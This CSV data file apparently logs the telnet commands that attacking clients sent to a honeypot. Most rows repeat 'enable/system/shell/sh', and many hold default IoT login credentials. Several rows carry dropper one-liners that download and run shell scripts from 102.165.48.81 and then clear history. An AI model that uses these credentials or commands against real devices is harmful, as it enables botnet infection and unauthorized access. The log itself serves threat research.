id,command,connections_id
9022,system,87847
9023,shell,87847
9024,sh,87847
9025,enable,87848
9026,system,87848
9027,shell,87848
9028,sh,87848
9029,enable,87851
9030,system,87851
9031,shell,87851
9032,sh,87851
9033,enable,87869
9034,system,87869
9035,shell,87869
9036,sh,87869
9037,enable,88020
9038,system,88020
9039,shell,88020
9040,sh,88020
9041,enable,88074
9042,system,88074
9043,shell,88074
9044,sh,88074
9045,enable,88102
9046,system,88102
9047,shell,88102
9048,sh,88102
9049,enable,88119
9050,system,88119
9051,shell,88119
9052,sh,88119
9053,enable,88182
9054,system,88182
9055,shell,88182
9056,sh,88182
9057,enable,88353
9058,system,88353
9059,shell,88353
9060,sh,88353
9061,enable,88355
9062,system,88355
9063,shell,88355
9064,sh,88355
9065,enable,88361
9066,system,88361
9067,shell,88361
9068,sh,88361
9069,enable,88366
9070,system,88366
9071,shell,88366
9072,sh,88366
9073,enable,88386
9074,system,88386
9075,shell,88386
9076,sh,88386
9077,enable,88388
9078,system,88388
9079,shell,88388
9080,sh,88388
9081,enable,88392
9082,system,88392
9083,shell,88392
9084,sh,88392
9085,enable,88432
9086,system,88432
9087,shell,88432
9088,sh,88432
9089,enable,88453
9090,system,88453
9091,shell,88453
9092,sh,88453
9093,enable,88455
9094,system,88455
9095,shell,88455
9096,sh,88455
9097,enable,88483
9098,system,88483
9099,shell,88483
9100,sh,88483
9101,root,88490
9102,1001chin,88490
9103,Administrator,88490
9104,admin,88490
9105,enable,88492
9106,system,88492
9107,shell,88492
9108,sh,88492
9109,enable,88537
9110,system,88537
9111,shell,88537
9112,sh,88537
9113,enable,88581
9114,system,88581
9115,shell,88581
9116,sh,88581
9117,enable,88584
9118,system,88584
9119,shell,88584
9120,sh,88584
9121,enable,88605
9122,system,88605
9123,shell,88605
9124,sh,88605
9125,enable,88608
9126,system,88608
9127,shell,88608
9128,sh,88608
9129,enable,88638
9130,system,88638
9131,shell,88638
9132,sh,88638
9133,enable,88649
9134,system,88649
9135,shell,88649
9136,sh,88649
9137,enable,88699
9138,system,88699
9139,shell,88699
9140,sh,88699
9141,enable,88744
9142,system,88744
9143,shell,88744
9144,sh,88744
9145,enable,88751
9146,system,88751
9147,shell,88751
9148,sh,88751
9149,enable,88757
9150,system,88757
9151,shell,88757
9152,sh,88757
9153,enable,88780
9154,system,88780
9155,shell,88780
9156,sh,88780
9157,enable,88781
9158,system,88781
9159,shell,88781
9160,sh,88781
9161,enable,88793
9162,system,88793
9163,shell,88793
9164,sh,88793
9165,enable,88798
9166,system,88798
9167,shell,88798
9168,sh,88798
9169,enable,88800
9170,system,88800
9171,shell,88800
9172,sh,88800
9173,enable,88806
9174,system,88806
9175,shell,88806
9176,sh,88806
9177,enable,88827
9178,system,88827
9179,shell,88827
9180,sh,88827
9181,enable,88849
9182,system,88849
9183,shell,88849
9184,sh,88849
9185,enable,88860
9186,system,88860
9187,shell,88860
9188,sh,88860
9189,enable,88925
9190,system,88925
9191,shell,88925
9192,sh,88925
9193,enable,89354
9194,system,89354
9195,shell,89354
9196,sh,89354
9197,enable,89358
9198,system,89358
9199,shell,89358
9200,sh,89358
9201,enable,89362
9202,system,89362
9203,shell,89362
9204,sh,89362
9205,enable,89446
9206,system,89446
9207,shell,89446
9208,sh,89446
9209,enable,89448
9210,system,89448
9211,shell,89448
9212,sh,89448
9213,enable,89449
9214,system,89449
9215,shell,89449
9216,sh,89449
9217,enable,89453
9218,system,89453
9219,shell,89453
9220,sh,89453
9221,enable,89597
9222,system,89597
9223,shell,89597
9224,sh,89597
9225,enable,89598
9226,system,89598
9227,shell,89598
9228,sh,89598
9229,enable,89599
9230,system,89599
9231,shell,89599
9232,sh,89599
9233,enable,89632
9234,system,89632
9235,shell,89632
9236,sh,89632
9237,user,89667
9238,user,89667
9239,root,89667
9240,123456,89667
9241,admin,89668
9242,7ujMko0admin,89668
9243,root,89668
9244,admin,89669
9245,password,89669
9246,mother,89669
9247,root,89670
9248,ttnet,89670
9249,admin,89670
9250,ipcam_rt5350,89670
9251,supervisor,89671
9252,supervisor,89671
9253,root,89671
9254,GM8182,89671
9255,enable,89673
9256,system,89673
9257,shell,89673
9258,sh,89673
9259,root,89672
9260,1234,89672
9261,admin,89672
9262,root,89674
9263,pass,89674
9264,root,89674
9265,founder88,89674
9266,tech,89675
9267,tech,89675
9268,service,89675
9269,root,89676
9270,cat1029,89676
9271,root,89676
9272,1111,89676
9273,root,89677
9274,realtek,89677
9275,root,89677
9276,system,89677
9277,admin,89678
9278,zhongxing,89678
9279,guest,89678
9280,root,89679
9281,vizxv,89679
9282,root,89679
9283,root,89680
9284,zlxx.,89680
9285,enable,89681
9286,system,89681
9287,shell,89681
9288,sh,89681
9289,root,89682
9290,7ujMko0admin,89682
9291,admin,89683
9292,smcadmin,89683
9293,admin,89685
9294,vertex25ektks123,89685
9295,admin,89685
9296,1111,89685
9297,ubnt,89686
9298,ubnt,89686
9299,root,89686
9300,root,89687
9301,xc3511,89687
9302,admin,89687
9303,root,89688
9304,hunt5759,89688
9305,root,89689
9306,zsun1188,89689
9307,root,89690
9308,Win1doW$,89690
9309,root,89692
9310,support,89691
9311,1001chin,89692
9312,support,89691
9313,admin,89693
9314,1111111,89693
9315,admin,89693
9316,root,89694
9317,meinsm,89693
9318,jvbzd,89694
9319,admin,89695
9320,1234,89695
9321,root,89695
9322,888888,89695
9323,admin,89696
9324,root,89697
9325,meinsm,89696
9326,Zte521,89697
9327,root,89696
9328,root,89697
9329,hunt5759,89697
9330,root,89699
9331,7ujMko0vizxv,89699
9332,root,89698
9333,root,89699
9334,7ujMko0vizxv,89698
9335,5up,89699
9336,enable,89700
9337,system,89700
9338,shell,89700
9339,sh,89700
9340,root,89701
9341,juantech,89701
9342,administrator,89702
9343,1234,89702
9344,root,89703
9345,aquario,89703
9346,root,89703
9347,admin,89704
9348,Win1doW$,89704
9349,root,89704
9350,root,89705
9351,qazxsw,89705
9352,root,89705
9353,root,89706
9354,1234567890,89706
9355,root,89706
9356,admin,89707
9357,pass,89707
9358,root,89707
9359,admin,89708
9360,54321,89708
9361,admin,89708
9362,root,89709
9363,xmhdipc,89709
9364,root,89709
9365,666666,89710
9366,666666,89710
9367,root,89710
9368,root,89711
9369,888888,89711
9370,guest,89711
9371,12345,89711
9372,root,89712
9373,666666,89712
9374,default,89713
9375,antslq,89713
9376,admin,89713
9377,root,89714
9378,12345,89714
9379,root,89714
9380,root,89715
9381,root,89715
9382,admin,89715
9383,enable,89716
9384,system,89716
9385,shell,89716
9386,sh,89716
9387,enable,89718
9388,system,89718
9389,shell,89718
9390,sh,89718
9391,enable,89729
9392,system,89729
9393,shell,89729
9394,sh,89729
9395,enable,89797
9396,system,89797
9397,shell,89797
9398,sh,89797
9399,enable,89800
9400,system,89800
9401,shell,89800
9402,sh,89800
9403,enable,89828
9404,system,89828
9405,shell,89828
9406,sh,89828
9407,enable,89843
9408,system,89843
9409,shell,89843
9410,sh,89843
9411,enable,89854
9412,system,89854
9413,shell,89854
9414,sh,89854
9415,enable,89885
9416,system,89885
9417,shell,89885
9418,sh,89885
9419,enable,89913
9420,system,89913
9421,shell,89913
9422,sh,89913
9423,enable,89914
9424,system,89914
9425,shell,89914
9426,sh,89914
9427,enable,89917
9428,system,89917
9429,shell,89917
9430,sh,89917
9431,enable,89919
9432,system,89919
9433,shell,89919
9434,sh,89919
9435,enable,89920
9436,system,89920
9437,shell,89920
9438,sh,89920
9439,enable,89932
9440,enable,89933
9441,system,89932
9442,system,89933
9443,shell,89932
9444,shell,89933
9445,sh,89932
9446,sh,89933
9447,enable,89934
9448,system,89934
9449,shell,89934
9450,sh,89934
9451,enable,89996
9452,system,89996
9453,shell,89996
9454,sh,89996
9455,enable,90067
9456,system,90067
9457,shell,90067
9458,sh,90067
9459,enable,90074
9460,system,90074
9461,shell,90074
9462,sh,90074
9463,enable,90085
9464,system,90085
9465,shell,90085
9466,sh,90085
9467,enable,90087
9468,system,90087
9469,shell,90087
9470,sh,90087
9471,enable,90143
9472,system,90143
9473,shell,90143
9474,sh,90143
9475,enable,90144
9476,system,90144
9477,shell,90144
9478,sh,90144
9479,enable,90146
9480,system,90146
9481,shell,90146
9482,sh,90146
9483,enable,90203
9484,system,90203
9485,shell,90203
9486,sh,90203
9487,enable,90223
9488,system,90223
9489,shell,90223
9490,sh,90223
9491,enable,90368
9492,system,90368
9493,shell,90368
9494,sh,90368
9495,enable,90375
9496,system,90375
9497,shell,90375
9498,sh,90375
9499,enable,90376
9500,system,90376
9501,shell,90376
9502,sh,90376
9503,enable,90423
9504,system,90423
9505,shell,90423
9506,sh,90423
9507,enable,90438
9508,system,90438
9509,shell,90438
9510,sh,90438
9511,enable,90447
9512,system,90447
9513,shell,90447
9514,sh,90447
9515,enable,90448
9516,system,90448
9517,shell,90448
9518,sh,90448
9519,enable,90450
9520,system,90450
9521,shell,90450
9522,sh,90450
9523,enable,90489
9524,system,90489
9525,shell,90489
9526,sh,90489
9527,enable,90497
9528,system,90497
9529,shell,90497
9530,sh,90497
9531,enable,90520
9532,system,90520
9533,shell,90520
9534,sh,90520
9535,enable,90522
9536,system,90522
9537,shell,90522
9538,sh,90522
9539,enable,90536
9540,system,90536
9541,shell,90536
9542,sh,90536
9543,enable,90537
9544,system,90537
9545,shell,90537
9546,sh,90537
9547,enable,90584
9548,enable,90585
9549,enable,90586
9550,system,90584
9551,system,90586
9552,system,90585
9553,shell,90584
9554,shell,90586
9555,sh,90584
9556,shell,90585
9557,sh,90586
9558,sh,90585
9559,">/dev/netslink/.t && cd /dev/netslink/ && for a in `ls -a /dev/netslink/`; do >$a; done; >retrieve",90609
9560,">/tmp/.t && cd /tmp/ ; >retrieve",90609
9561,">/var/.t && cd /var/ ; >retrieve",90609
9562,">/dev/.t && cd /dev/ ; >retrieve",90609
9563,enable,90616
9564,system,90616
9565,shell,90616
9566,sh,90616
9567,enable,90688
9568,system,90688
9569,shell,90688
9570,sh,90688
9571,enable,90689
9572,system,90689
9573,shell,90689
9574,sh,90689
9575,enable,90702
9576,system,90702
9577,shell,90702
9578,sh,90702
9579,enable,90714
9580,system,90714
9581,shell,90714
9582,sh,90714
9583,enable,90718
9584,system,90718
9585,shell,90718
9586,sh,90718
9587,enable,90729
9588,system,90729
9589,shell,90729
9590,sh,90729
9591,enable,90744
9592,system,90744
9593,shell,90744
9594,sh,90744
9595,enable,90771
9596,system,90771
9597,shell,90771
9598,sh,90771
9599,"cd /tmp; wget http://0.0.0.0/update.sh; busybox wget http://0.0.0.0/update.sh; chmod 777 update.sh; sh update.sh; rm -f update.sh",90816
9600,enable,90862
9601,system,90862
9602,shell,90862
9603,sh,90862
9604,enable,90894
9605,system,90894
9606,shell,90894
9607,sh,90894
9608,enable,90911
9609,system,90911
9610,shell,90911
9611,sh,90911
9612,enable,90937
9613,system,90937
9614,shell,90937
9615,sh,90937
9616,enable,91098
9617,system,91098
9618,shell,91098
9619,sh,91098
9620,enable,91099
9621,system,91099
9622,shell,91099
9623,sh,91099
9624,enable,91102
9625,system,91102
9626,shell,91102
9627,sh,91102
9628,enable,91113
9629,system,91113
9630,shell,91113
9631,sh,91113
9632,enable,91137
9633,system,91137
9634,shell,91137
9635,sh,91137
9636,enable,91138
9637,system,91138
9638,shell,91138
9639,sh,91138
9640,enable,91145
9641,system,91145
9642,shell,91145
9643,sh,91145
9644,enable,91157
9645,system,91157
9646,shell,91157
9647,sh,91157
9648,enable,91171
9649,system,91171
9650,shell,91171
9651,sh,91171
9652,enable,91197
9653,system,91197
9654,shell,91197
9655,sh,91197
9656,enable,91205
9657,system,91205
9658,shell,91205
9659,sh,91205
9660,enable,91225
9661,system,91225
9662,shell,91225
9663,sh,91225
9664,enable,91229
9665,system,91229
9666,shell,91229
9667,sh,91229
9668,enable,91230
9669,system,91230
9670,shell,91230
9671,sh,91230
9672,enable,91231
9673,system,91231
9674,shell,91231
9675,sh,91231
9676,enable,91312
9677,system,91312
9678,shell,91312
9679,sh,91312
9680,enable,91328
9681,system,91328
9682,shell,91328
9683,sh,91328
9684,enable,91373
9685,system,91373
9686,shell,91373
9687,sh,91373
9688,enable,91381
9689,system,91381
9690,shell,91381
9691,sh,91381
9692,enable,91403
9693,system,91403
9694,shell,91403
9695,sh,91403
9696,sh,91457
9697,shell,91457
9698,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",91457
9699,sh,91457
9700,enable,91484
9701,system,91484
9702,shell,91484
9703,sh,91484
9704,enable,91490
9705,system,91490
9706,shell,91490
9707,sh,91490
9708,enable,91497
9709,system,91497
9710,shell,91497
9711,sh,91497
9712,enable,91506
9713,system,91506
9714,shell,91506
9715,sh,91506
9716,enable,91537
9717,system,91537
9718,shell,91537
9719,sh,91537
9720,enable,91538
9721,system,91538
9722,shell,91538
9723,sh,91538
9724,enable,91581
9725,system,91581
9726,shell,91581
9727,sh,91581
9728,"From: <sip:nm@nm>;tag=root",91650
9729,"To: <sip:nm2@nm2>",91650
9730,"Call-ID: 50000",91650
9731,"CSeq: 42 OPTIONS",91650
9732,enable,91667
9733,system,91667
9734,shell,91667
9735,sh,91667
9736,enable,91830
9737,system,91830
9738,shell,91830
9739,sh,91830
9740,enable,91894
9741,system,91894
9742,shell,91894
9743,sh,91894
9744,enable,91931
9745,system,91931
9746,shell,91931
9747,sh,91931
9748,enable,91932
9749,system,91932
9750,shell,91932
9751,sh,91932
9752,enable,91944
9753,system,91944
9754,shell,91944
9755,sh,91944
9756,enable,91965
9757,system,91965
9758,shell,91965
9759,sh,91965
9760,enable,91978
9761,system,91978
9762,shell,91978
9763,sh,91978
9764,enable,91980
9765,system,91980
9766,shell,91980
9767,sh,91980
9768,enable,92033
9769,system,92033
9770,shell,92033
9771,sh,92033
9772,enable,92060
9773,system,92060
9774,shell,92060
9775,sh,92060
9776,enable,92061
9777,system,92061
9778,shell,92061
9779,sh,92061
9780,enable,92108
9781,system,92108
9782,shell,92108
9783,sh,92108
9784,enable,92127
9785,system,92127
9786,shell,92127
9787,sh,92127
9788,enable,92144
9789,system,92144
9790,shell,92144
9791,sh,92144
9792,enable,92168
9793,system,92168
9794,shell,92168
9795,sh,92168
9796,enable,92183
9797,system,92183
9798,shell,92183
9799,sh,92183
9800,enable,92185
9801,system,92185
9802,shell,92185
9803,sh,92185
9804,enable,92210
9805,system,92210
9806,shell,92210
9807,sh,92210
9808,enable,92225
9809,system,92225
9810,shell,92225
9811,sh,92225
9812,enable,92284
9813,system,92284
9814,shell,92284
9815,sh,92284
9816,enable,92317
9817,system,92317
9818,shell,92317
9819,sh,92317
9820,sh,92318
9821,shell,92318
9822,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",92318
9823,sh,92318
9824,enable,92332
9825,system,92332
9826,shell,92332
9827,sh,92332
9828,enable,92423
9829,system,92423
9830,shell,92423
9831,sh,92423
9832,enable,92430
9833,system,92430
9834,shell,92430
9835,sh,92430
9836,enable,92431
9837,system,92431
9838,shell,92431
9839,sh,92431
9840,enable,92432
9841,system,92432
9842,shell,92432
9843,sh,92432
9844,enable,92433
9845,system,92433
9846,shell,92433
9847,sh,92433
9848,enable,92448
9849,system,92448
9850,shell,92448
9851,sh,92448
9852,enable,92452
9853,system,92452
9854,shell,92452
9855,sh,92452
9856,enable,92455
9857,system,92455
9858,shell,92455
9859,sh,92455
9860,enable,92456
9861,system,92456
9862,shell,92456
9863,sh,92456
9864,enable,92516
9865,system,92516
9866,shell,92516
9867,sh,92516
9868,enable,92529
9869,system,92529
9870,shell,92529
9871,sh,92529
9872,enable,92569
9873,system,92569
9874,shell,92569
9875,sh,92569
9876,enable,92570
9877,system,92570
9878,shell,92570
9879,sh,92570
9880,enable,92572
9881,system,92572
9882,shell,92572
9883,sh,92572
9884,enable,92573
9885,system,92573
9886,shell,92573
9887,sh,92573
9888,enable,92574
9889,system,92574
9890,shell,92574
9891,sh,92574
9892,enable,92578
9893,system,92578
9894,shell,92578
9895,sh,92578
9896,enable,92579
9897,system,92579
9898,shell,92579
9899,sh,92579
9900,enable,92590
9901,system,92590
9902,shell,92590
9903,sh,92590
9904,enable,92598
9905,system,92598
9906,shell,92598
9907,sh,92598
9908,enable,92600
9909,system,92600
9910,shell,92600
9911,sh,92600
9912,enable,92601
9913,system,92601
9914,shell,92601
9915,sh,92601
9916,enable,92627
9917,system,92627
9918,shell,92627
9919,sh,92627
9920,enable,92644
9921,system,92644
9922,shell,92644
9923,sh,92644
9924,enable,92645
9925,system,92645
9926,shell,92645
9927,sh,92645
9928,enable,92684
9929,system,92684
9930,shell,92684
9931,sh,92684
9932,enable,92685
9933,system,92685
9934,shell,92685
9935,sh,92685
9936,enable,92707
9937,system,92707
9938,shell,92707
9939,sh,92707
9940,enable,92713
9941,system,92713
9942,shell,92713
9943,sh,92713
9944,enable,92715
9945,system,92715
9946,shell,92715
9947,sh,92715
9948,enable,92732
9949,system,92732
9950,shell,92732
9951,sh,92732
9952,enable,92755
9953,system,92755
9954,shell,92755
9955,sh,92755
9956,enable,92768
9957,system,92768
9958,shell,92768
9959,sh,92768
9960,enable,92770
9961,system,92770
9962,shell,92770
9963,sh,92770
9964,enable,92775
9965,system,92775
9966,shell,92775
9967,sh,92775
9968,enable,92797
9969,system,92797
9970,shell,92797
9971,sh,92797
9972,enable,92822
9973,system,92822
9974,shell,92822
9975,sh,92822
9976,enable,92846
9977,system,92846
9978,shell,92846
9979,sh,92846
9980,enable,92853
9981,system,92853
9982,shell,92853
9983,sh,92853
9984,enable,92894
9985,system,92894
9986,shell,92894
9987,sh,92894
9988,enable,92912
